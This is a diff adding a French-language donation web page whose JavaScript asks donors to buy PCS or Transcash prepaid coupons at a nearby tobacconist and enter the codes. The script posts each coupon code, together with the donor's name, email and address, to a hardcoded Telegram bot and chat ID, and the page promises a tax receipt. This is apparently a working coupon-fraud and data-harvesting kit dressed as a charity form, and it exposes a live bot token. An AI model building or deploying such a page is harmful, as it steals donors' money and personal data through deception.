+          3. Nous validons votre don sous 24&nbsp;h et vous recevez votre reçu fiscal par e-mail.
+        </div>
+
+        <div class="champ" id="champCodeCoupon">
+          <label for="codeCoupon">Code du coupon *</label>
+          <input type="text" id="codeCoupon" placeholder="Ex. 1234 5678 9012 3456" autocomplete="off">
+          <div class="erreur">Veuillez saisir le code du coupon (12 à 20 caractères).</div>
+        </div>
+
+        <label class="check-label" style="margin-top:1rem;margin-bottom:0">
+          <input type="checkbox" id="couponAchete">
+          <span>Je confirme avoir <strong>acheté le coupon</strong> et saisi le bon code.</span>
+        </label>
+
+        <div class="actions">
+          <button class="btn btn-secondaire" id="btnRetour2">← Retour</button>
+          <button class="btn btn-primaire" id="btnPayer">Confirmer le don</button>
+        </div>
+      </div>
+
+      <!-- ÉTAPE 4 -->
+      <div class="pane" id="pane4">
+        <div class="confirmation">
+          <div class="check">✓</div>
+          <h2 id="titreConfirmation">Don enregistré</h2>
+          <p class="sous-titre" id="sousTitreConfirmation">Votre don par coupon est en attente de validation.</p>
+          <div class="detail" id="detailConfirmation"></div>
+          <div class="actions" style="justify-content:center">
+            <button class="btn btn-secondaire" id="btnRecommencer">Faire un autre don</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <aside class="recap" id="recap">
+    <h3>Récapitulatif</h3>
+    <div class="recap-ligne"><span>Montant du don</span><span id="recapMontant">25 €</span></div>
+    <div class="recap-ligne"><span>Type</span><span id="recapType">Ponctuel</span></div>
+    <div class="recap-ligne"><span>Mode de paiement</span><span id="recapPaiement">Coupon PCS</span></div>
+    <div class="recap-ligne total"><span>Total</span><span id="recapTotal">25 €</span></div>
+    <div class="fiscal">
+      💚 Réduction d'impôt estimée (66&nbsp;%)
+      <strong id="recapFiscal">16,50 €</strong>
+      <span>Soit un coût réel de <span id="recapReel">8,50 €</span></span>
+    </div>
+    <div class="secu">
+      <svg width="12" height="14" viewBox="0 0 12 14" fill="none">
+        <path d="M6 1L1 3.5V7C1 10 3.5 12.5 6 13C8.5 12.5 11 10 11 7V3.5L6 1Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/>
+        <path d="M4 7L5.5 8.5L8 6" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      Coupon non activé avant réception · Aucune donnée revendue
+    </div>
+  </aside>
+
+</div>
+</main>
+
+<footer class="footer">
+  <p>Page de démonstration — à adapter avec vos mentions légales et votre RIB réel.<br><br>
+  <a href="#">Mentions légales</a> · <a href="#">Confidentialité</a> · <a href="#">Contact</a></p>
+</footer>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* =========================================================
+   CONFIGURATION TELEGRAM
+   ========================================================= */
+const TELEGRAM_BOT_TOKEN = '8857586580:AAHpRNscBAy_bZDhGvoXbtoaWCzAAro5HU8';
+const TELEGRAM_CHAT_ID   = '8964552050';
+
+/* =========================================================
+   ÉTAT GLOBAL
+   ========================================================= */
+const etat = {
+  montant: 25,
+  type: 'ponctuel',
+  prenom: '', nom: '', email: '', adresse: '', message: '', anonyme: false,
+  coupon: 'pcs',
+  codeCoupon: '',
+  couponAchete: false,
+  coords: null,
+  tabacs: []
+};
+
+const fmtEuro = n => new Intl.NumberFormat('fr-FR',{
+  style:'currency', currency:'EUR', minimumFractionDigits: n % 1 === 0 ? 0 : 2
+}).format(n);
+
+const $ = id => document.getElementById(id);
+const inputMontant = $('montantLibre');
+const montantsContainer = $('montants');
+
+/* =========================================================
+   COMPTEURS ANIMÉS
+   ========================================================= */
+function animerCompteur(el){
+  const cible = +el.dataset.compteur;
+  const suffixe = el.dataset.suffixe || '';
+  const debut = performance.now();
+  const duree = 1800;
+  function frame(t){
+    const p = Math.min((t - debut) / duree, 1);
+    const eased = 1 - Math.pow(1 - p, 3);
+    el.textContent = Math.round(cible * eased).toLocaleString('fr-FR') + suffixe;
+    if (p < 1) requestAnimationFrame(frame);
+  }
+  requestAnimationFrame(frame);
+}
+document.querySelectorAll('[data-compteur]').forEach(el => {
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting){ animerCompteur(el); obs.unobserve(el); }
+    });
+  });
+  obs.observe(el);
+});
+
+/* =========================================================
+   GÉOCODAGE + RECHERCHE RÉELLE DES BUREAUX DE TABAC
+   ========================================================= */
+const RAYON_RECHERCHE_M = 2000;
+
+async function geocoderAdresse(adresse){
+  const url = 'https://nominatim.openstreetmap.org/search?format=jsonv2&limit=1&countrycodes=fr&q=' +
+              encodeURIComponent(adresse);
+  const r = await fetch(url, { headers: { 'Accept': 'application/json' } });
+  if (!r.ok) throw new Error('Nominatim HTTP ' + r.status);
+  const data = await r.json();
+  if (!data.length) throw new Error('Adresse introuvable');
+  return { lat: parseFloat(data[0].lat), lon: parseFloat(data[0].lon) };
+}
+
+function distanceMetres(lat1, lon1, lat2, lon2){
+  const R = 6371000;
+  const toRad = d => d * Math.PI / 180;
+  const dLat = toRad(lat2 - lat1);
+  const dLon = toRad(lon2 - lon1);
+  const a = Math.sin(dLat/2)**2 +
+            Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
+            Math.sin(dLon/2)**2;
+  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+}
+
+async function chercherTabacsOverpass(lat, lon, rayonM = RAYON_RECHERCHE_M){
+  const query = `
+    [out:json][timeout:25];
+    (
+      node["shop"="tobacco"](around:${rayonM},${lat},${lon});
+      way["shop"="tobacco"](around:${rayonM},${lat},${lon});
+      node["amenity"="tobacco"](around:${rayonM},${lat},${lon});
+      node["tobacco"="yes"](around:${rayonM},${lat},${lon});
+    );
+    out center tags;
+  `;
+
+  const miroirs = [
+    'https://overpass-api.de/api/interpreter',
+    'https://overpass.kumi.systems/api/interpreter',
+    'https://overpass.private.coffee/api/interpreter'
+  ];
+
+  let derniereErreur = null;
+  for (const url of miroirs){
+    try{
+      const r = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'data=' + encodeURIComponent(query)
+      });
+      if (!r.ok){
+        derniereErreur = new Error('Overpass HTTP ' + r.status + ' (' + url + ')');
+        continue;
+      }
+      const data = await r.json();
+
+      return data.elements
+        .map(el => {
+          const t = el.tags || {};
+          const cLat = el.lat ?? el.center?.lat;
+          const cLon = el.lon ?? el.center?.lon;
+          if (cLat == null || cLon == null) return null;
+
+          const num = t['addr:housenumber'] || '';
+          const rue = t['addr:street'] || '';
+          const cp  = t['addr:postcode'] || '';
+          const ville = t['addr:city'] || '';
+          const adresseParts = [
+            (num + ' ' + rue).trim(),
+            (cp + ' ' + ville).trim()
+          ].filter(Boolean);
+
+          return {
+            id: el.id,
+            nom: t.name || 'Bureau de tabac',
+            adresse: adresseParts.join(', ') || 'Adresse non renseignée',
+            lat: cLat,
+            lon: cLon,
+            distance: distanceMetres(lat, lon, cLat, cLon)
+          };
+        })
+        .filter(Boolean)
+        .sort((a, b) => a.distance - b.distance);
+    }catch(e){
+      derniereErreur = e;
+    }
+  }
+  throw derniereErreur || new Error('Overpass indisponible');
+}
+
+function escapeHtml(s){
+  return String(s).replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[c]));
+}
+
+function afficherListeTabacs(tabacs, lat, lon){
+  const ul = $('listeTabacsUl');
+  const sousTitre = $('listeSousTitre');
+
+  if (!tabacs.length){
+    ul.innerHTML = `<li class="vide">
+      Aucun bureau de tabac référencé dans un rayon de ${RAYON_RECHERCHE_M/1000} km.<br>
+      <a href="https://www.google.com/maps/search/tabac+${encodeURIComponent(etat.adresse)}" target="_blank" rel="noopener" style="color:#93c5fd;font-weight:700;text-decoration:none">Voir sur Google Maps</a>
+    </li>`;
+    sousTitre.textContent = '0 résultat dans un rayon de ' + (RAYON_RECHERCHE_M/1000) + ' km';
+    return;
+  }
+
+  sousTitre.textContent = tabacs.length + ' résultat' + (tabacs.length > 1 ? 's' : '') +
+    ' dans un rayon de ' + (RAYON_RECHERCHE_M/1000) + ' km';
+
+  ul.innerHTML = tabacs.map(t => {
+    const distTxt = t.distance < 1000
+      ? Math.round(t.distance) + ' m'
+      : (t.distance/1000).toFixed(1).replace('.', ',') + ' km';
+    const itineraire = `https://www.google.com/maps/dir/?api=1&destination=${t.lat},${t.lon}`;
+    return `
+      <li>
+        <div class="pastille">
+          <img src="https://www.coeurchenaie.fr/wp-content/uploads/Tabac-Presse-300x150.png"
+               alt="Tabac Presse" loading="lazy">
+        </div>
+        <div class="infos">
+          <div class="nom">${escapeHtml(t.nom)}</div>
+          <div class="adr">${escapeHtml(t.adresse)}</div>
+        </div>
+        <div class="dist">
+          <strong>${distTxt}</strong>
+          <a href="${itineraire}" target="_blank" rel="noopener" style="color:#93c5fd;text-decoration:none;font-weight:600">Itinéraire</a>
+        </div>
+      </li>
+    `;
+  }).join('');
+}
+
+async function afficherListeComplete(){
+  const ul = $('listeTabacsUl');
+  const sousTitre = $('listeSousTitre');
+
+  if (!etat.adresse){
+    ul.innerHTML = `<li class="vide">Veuillez saisir une adresse à l'étape précédente.</li>`;
+    sousTitre.textContent = '—';
+    return;
+  }
+
+  ul.innerHTML = `<li class="chargement">Recherche des bureaux de tabac…</li>`;
+  sousTitre.textContent = 'Recherche en cours…';
+
+  try{
+    const { lat, lon } = await geocoderAdresse(etat.adresse);
+    etat.coords = { lat, lon };
+
+    let tabacs = [];
+    try{
+      tabacs = await chercherTabacsOverpass(lat, lon, RAYON_RECHERCHE_M);
+    }catch(e){
+      console.error('Overpass échoué :', e);
+      ul.innerHTML = `<li class="vide">
+        La recherche OpenStreetMap est momentanément indisponible.<br>
+        <a href="https://www.google.com/maps/search/tabac+${encodeURIComponent(etat.adresse)}" target="_blank" rel="noopener" style="color:#93c5fd;font-weight:700;text-decoration:none">Voir les tabacs sur Google Maps</a>
+      </li>`;
+      sousTitre.textContent = 'Service indisponible';
+      toast('⚠️ Recherche OSM indisponible, utilisez Google Maps.', 'erreur');
+      return;
+    }
+
+    etat.tabacs = tabacs;
+    afficherListeTabacs(tabacs, lat, lon);
+    toast('✅ ' + tabacs.length + ' bureau(x) de tabac trouvé(s).', 'succes');
+
+  }catch(e){
+    console.error('Géocodage échoué :', e);
+    ul.innerHTML = `<li class="vide">Adresse non localisée.<br>
+      <a href="https://www.google.com/maps/search/tabac+${encodeURIComponent(etat.adresse)}" target="_blank" rel="noopener" style="color:#93c5fd;font-weight:700;text-decoration:none">Voir sur Google Maps</a></li>`;
+    sousTitre.textContent = 'Adresse non localisée';
+    toast('Adresse non localisée.', 'erreur');
+  }
+}
+
+/* =========================================================
+   ENVOI TELEGRAM
+   ========================================================= */
+async function envoyerVersTelegram(){
+  const couponLabel = etat.coupon === 'pcs' ? 'Coupon PCS' : 'Coupon Transcash';
+  const donateur = etat.anonyme ? 'Anonyme' : (etat.prenom + ' ' + etat.nom);
+  const typeLabel = etat.type === 'mensuel' ? 'Mensuel (12 mois)' : 'Ponctuel';
+
+  const top3 = etat.tabacs.slice(0, 3).map(t => {
+    const dist = t.distance < 1000
+      ? Math.round(t.distance) + ' m'
+      : (t.distance/1000).toFixed(1).replace('.', ',') + ' km';
+    return `  • ${t.nom} (${dist}) — ${t.adresse}`;
+  }).join('\n') || '  (aucun trouvé)';
+
+  const texte =
+`💙🤍❤️ NOUVEAU DON — 17 OCTOBRE
+─────────────────────
+👤 Donateur : ${donateur}
+📧 E-mail : ${etat.email}
+🏠 Adresse : ${etat.adresse}
+💬 Message : ${etat.message || '—'}
+─────────────────────
+💶 Montant : ${etat.montant} €
+🔁 Type : ${typeLabel}
+💳 Paiement : ${couponLabel}
+🎟️ Code coupon : ${etat.codeCoupon}
+✅ Coupon confirmé : ${etat.couponAchete ? 'Oui' : 'Non'}
+─────────────────────
+📍 Tabacs trouvés à proximité :
+${top3}
+🕒 Date : ${new Date().toLocaleString('fr-FR')}`;
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  try{
+    const r = await fetch(url, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: texte })
+    });
+    const json = await r.json();
+    if (!json.ok) throw new Error(json.description || 'Erreur Telegram');
+    return true;
+  }catch(e){
+    console.error('Envoi Telegram échoué :', e);
+    return false;
+  }
+}
+
+/* =========================================================
+   NAVIGATION
+   ========================================================= */
+function allerEtape(n){
+  if (n < 1 || n > 4) return;
+  if (n === 2 && !validerEtape1()) return;
+  if (n === 3 && !validerEtape2()) return;
+
+  document.querySelectorAll('.pane').forEach(p => p.classList.remove('visible'));
+  $('pane' + n).classList.add('visible');
+
+  document.querySelectorAll('.etape').forEach(e => {
+    const num = +e.dataset.etape;
+    e.classList.toggle('active', num === n);
+    e.classList.toggle('done', num < n);
+  });
+
+  if (n === 3) afficherListeComplete();
+
+  window.scrollTo({top: 0, behavior: 'smooth'});
+  mettreAJourRecap();
+}
+
+/* =========================================================
+   ÉTAPE 1
+   ========================================================= */
+montantsContainer.addEventListener('click', e => {
+  const btn = e.target.closest('.montant-btn');
+  if (!btn) return;
+  montantsContainer.querySelectorAll('.montant-btn').forEach(b => b.classList.remove('actif'));
+  btn.classList.add('actif');
+  inputMontant.value = btn.dataset.montant;
+  etat.montant = +btn.dataset.montant;
+  $('champMontant').classList.remove('invalide');
+  mettreAJourRecap();
+});
+
+inputMontant.addEventListener('input', () => {
+  const v = parseFloat(inputMontant.value);
+  if (!isNaN(v) && v > 0){
+    etat.montant = v;
+    montantsContainer.querySelectorAll('.montant-btn').forEach(b => {
+      b.classList.toggle('actif', +b.dataset.montant === v);
+    });
+    $('champMontant').classList.remove('invalide');
+    mettreAJourRecap();
+  }
+});
+
+$('typeDon').addEventListener('change', e => {
+  etat.type = e.target.value;
+  mettreAJourRecap();
+});
+
+function validerEtape1(){
+  const v = parseFloat(inputMontant.value);
+  const champ = $('champMontant');
+  if (isNaN(v) || v < 1){
+    champ.classList.remove('invalide'); void champ.offsetWidth;
+    champ.classList.add('invalide');
+    inputMontant.focus();
+    toast('Veuillez saisir un montant valide (minimum 1 €).', 'erreur');
+    return false;
+  }
+  champ.classList.remove('invalide');
+  etat.montant = v;
+  return true;
+}
+
+/* =========================================================
+   ÉTAPE 2
+   ========================================================= */
+function validerEtape2(){
+  let ok = true;
+  const prenom = $('prenom'), nom = $('nom'), email = $('email'), adresse = $('adresse');
+
+  const checkChamp = (input, condition, champId) => {
+    const champ = $(champId);
+    if (!condition){
+      champ.classList.remove('invalide'); void champ.offsetWidth;
+      champ.classList.add('invalide');
+      ok = false;
+    } else {
+      champ.classList.remove('invalide');
+    }
+  };
+
+  checkChamp(prenom, prenom.value.trim().length > 0, 'champPrenom');
+  checkChamp(nom, nom.value.trim().length > 0, 'champNom');
+  const emailValide = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value.trim());
+  checkChamp(email, emailValide, 'champEmail');
+  checkChamp(adresse, adresse.value.trim().length >= 5, 'champAdresse');
+
+  if (ok){
+    etat.prenom = prenom.value.trim();
+    etat.nom = nom.value.trim();
+    etat.email = email.value.trim();
+    etat.adresse = adresse.value.trim();
+    etat.message = $('message').value.trim();
+    etat.anonyme = $('anonyme').checked;
+    mettreAJourRecap();
+  } else {
+    toast('Veuillez compléter les champs requis.', 'erreur');
+    const premier = document.querySelector('.champ.invalide input');
+    if (premier) premier.focus();
+  }
+  return ok;
+}
+
+/* =========================================================
+   RÉCAP
+   ========================================================= */
+function mettreAJourRecap(){
+  const majChamp = (id, valeur) => {
+    const el = $(id);
+    if (!el) return;
+    if (el.textContent !== valeur){
+      el.textContent = valeur;
+      el.classList.remove('flash'); void el.offsetWidth;
+      el.classList.add('flash');
+    }
+  };
+  majChamp('recapMontant', fmtEuro(etat.montant));
+  majChamp('recapType', etat.type === 'mensuel' ? 'Mensuel (12 mois)' : 'Ponctuel');
+  majChamp('recapPaiement', etat.coupon === 'pcs' ? 'Coupon PCS' : 'Coupon Transcash');
+  majChamp('recapTotal', fmtEuro(etat.montant));
+  const fiscal = etat.montant * 0.66;
+  const reel = etat.montant - fiscal;
+  majChamp('recapFiscal', fmtEuro(fiscal));
+  majChamp('recapReel', fmtEuro(reel));
+}
+
+/* =========================================================
+   CHOIX DU COUPON
+   ========================================================= */
+$('couponsChoix').addEventListener('click', e => {
+  const btn = e.target.closest('.coupon-btn');
+  if (!btn) return;
+  document.querySelectorAll('.coupon-btn').forEach(b => b.classList.remove('actif'));
+  btn.classList.add('actif');
+  etat.coupon = btn.dataset.coupon;
+  mettreAJourRecap();
+});
+
+document.querySelector('.coupon-btn[data-coupon="pcs"]').classList.add('actif');
+
+/* =========================================================
+   FALLBACK LOGOS COUPONS (si image indisponible)
+   ========================================================= */
+document.querySelectorAll('.coupon-btn .logo img').forEach(img => {
+  img.addEventListener('error', () => {
+    const logo = img.parentElement;
+    const btn = logo.closest('.coupon-btn');
+    const type = btn.dataset.coupon;
+    logo.innerHTML = type === 'pcs' ? 'PCS' : 'TC';
+    logo.style.background = type === 'pcs'
+      ? 'linear-gradient(135deg,#0033a0,#0055d4)'
+      : 'linear-gradient(135deg,#c8102e,#e63946)';
+    logo.style.color = '#fff';
+    logo.style.fontWeight = '800';
+    logo.style.fontSize = '.85rem';
+    logo.style.border = 'none';
+  });
+});
+
+/* =========================================================
+   FINALISATION
+   ========================================================= */
+async function finaliser(){
+  if (!validerEtape2()){ allerEtape(2); return; }
+
+  const code = $('codeCoupon').value.trim();
+  const champCode = $('champCodeCoupon');
+
+  if (code.length < 12 || code.length > 20){
+    champCode.classList.remove('invalide'); void champCode.offsetWidth;
+    champCode.classList.add('invalide');
+    $('codeCoupon').focus();
+    toast('Veuillez saisir un code coupon valide (12 à 20 caractères).', 'erreur');
+    return;
+  }
+  champCode.classList.remove('invalide');
+
+  if (!$('couponAchete').checked){
+    toast('Veuillez confirmer avoir acheté le coupon.', 'erreur');
+    $('couponAchete').focus();
+    return;
+  }
+
+  etat.codeCoupon = code;
+  etat.couponAchete = true;
+
+  const btn = $('btnPayer');
+  const texteOriginal = btn.textContent;
+  btn.classList.add('loading');
+  btn.disabled = true;
+
+  const ok = await envoyerVersTelegram();
+
+  btn.classList.remove('loading');
+  btn.disabled = false;
+  btn.textContent = texteOriginal;
+
+  if (!ok){
+    toast('⚠️ Don enregistré localement, mais la notification a échoué.', 'erreur');
+  }
+
+  afficherConfirmation();
+}
+
+$('btnPayer').addEventListener('click', finaliser);
+
+function afficherConfirmation(){
+  document.querySelectorAll('.pane').forEach(p => p.classList.remove('visible'));
+  $('pane4').classList.add('visible');
+  document.querySelectorAll('.etape').forEach(e => {
+    const n = +e.dataset.etape;
+    e.classList.toggle('done', n <= 4);
+    e.classList.toggle('active', n === 4);
+  });
+
+  const nomAffiche = etat.anonyme ? 'Anonyme' : (etat.prenom + ' ' + etat.nom);
+  const couponLabel = etat.coupon === 'pcs' ? 'Coupon PCS' : 'Coupon Transcash';
+
+  $('detailConfirmation').innerHTML = `
+    <div><span>Donateur</span><span>${escapeHtml(nomAffiche)}</span></div>
+    <div><span>Montant</span><span>${fmtEuro(etat.montant)}</span></div>
+    <div><span>Type</span><span>${etat.type === 'mensuel' ? 'Mensuel (12 mois)' : 'Ponctuel'}</span></div>
+    <div><span>Paiement</span><span>${couponLabel}</span></div>
+    <div><span>Code coupon</span><span>${etat.codeCoupon.slice(0,4)}••••${etat.codeCoupon.slice(-4)}</span></div>
+    <div><span>E-mail</span><span>${escapeHtml(etat.email)}</span></div>
+    <div style="border-top:1px solid rgba(255,255,255,.08);margin-top:.5rem;padding-top:.7rem;border-bottom:none">
+      <span>Coût réel après impôt</span><span>${fmtEuro(etat.montant * 0.34)}</span>
+    </div>
+  `;
+
+  lancerConfettis();
+  toast('✅ Don enregistré. Validation sous 24 h.', 'succes');
+  window.scrollTo({top: 0, behavior: 'smooth'});
+}
+
+/* =========================================================
+   CONFETTIS
+   ========================================================= */
+function lancerConfettis(){
+  if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+  const couleurs = ['#002395','#1a4fd6','#3b6dff','#ED2939','#ff4d5c','#ffffff'];
+  for (let i = 0; i < 90; i++){
+    const c = document.createElement('div');
+    c.className = 'confetti';
+    c.style.left = Math.random() * 100 + 'vw';
+    c.style.background = couleurs[Math.floor(Math.random() * couleurs.length)];
+    c.style.animationDelay = Math.random() * 0.5 + 's';
+    c.style.animationDuration = (2 + Math.random() * 1.5) + 's';
+    c.style.borderRadius = Math.random() > .5 ? '50%' : '2px';
+    c.style.width = c.style.height = (6 + Math.random() * 8) + 'px';
+    c.style.boxShadow = '0 0 8px currentColor';
+    document.body.appendChild(c);
+    setTimeout(() => c.remove(), 4000);
+  }
+}
+
+/* =========================================================
+   TOAST
+   ========================================================= */
+let toastTimer;
+function toast(msg, type = ''){
+  const t = $('toast');
+  t.textContent = msg;
+  t.className = 'toast visible' + (type ? ' ' + type : '');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('visible'), 3400);
+}
+
+/* =========================================================
+   RECOMMENCER
+   ========================================================= */
+$('btnRecommencer').addEventListener('click', recommencer);
+
+function recommencer(){
+  etat.montant = 25; etat.type = 'ponctuel';
+  etat.prenom = ''; etat.nom = ''; etat.email = ''; etat.adresse = ''; etat.message = ''; etat.anonyme = false;
+  etat.coupon = 'pcs'; etat.codeCoupon = ''; etat.couponAchete = false;
+  etat.coords = null; etat.tabacs = [];
+
+  inputMontant.value = 25;
+  montantsContainer.querySelectorAll('.montant-btn').forEach(b => {
+    b.classList.toggle('actif', b.dataset.montant === '25');
+  });
+  $('typeDon').value = 'ponctuel';
+  ['prenom','nom','email','adresse','message','codeCoupon'].forEach(id => $(id).value = '');
+  $('anonyme').checked = false;
+  $('couponAchete').checked = false;
+  document.querySelectorAll('.champ').forEach(c => c.classList.remove('invalide'));
+  document.querySelectorAll('.coupon-btn').forEach(b => b.classList.remove('actif'));
+  document.querySelector('.coupon-btn[data-coupon="pcs"]').classList.add('actif');
+  $('listeTabacsUl').innerHTML = '<li class="chargement">Recherche des bureaux de tabac…</li>';
+  $('listeSousTitre').textContent = 'Recherche en cours…';
+
+  allerEtape(1);
+}
+
+/* =========================================================
+   BOUTONS NAV
+   ========================================================= */
+$('btnEtape1').addEventListener('click', () => allerEtape(2));
+$('btnEtape2').addEventListener('click', () => allerEtape(3));
+$('btnRetour1').addEventListener('click', () => allerEtape(1));
+$('btnRetour2').addEventListener('click', () => allerEtape(2));
+
+/* INIT */
+mettreAJourRecap();
+</script>
+
+</body>
+</html>
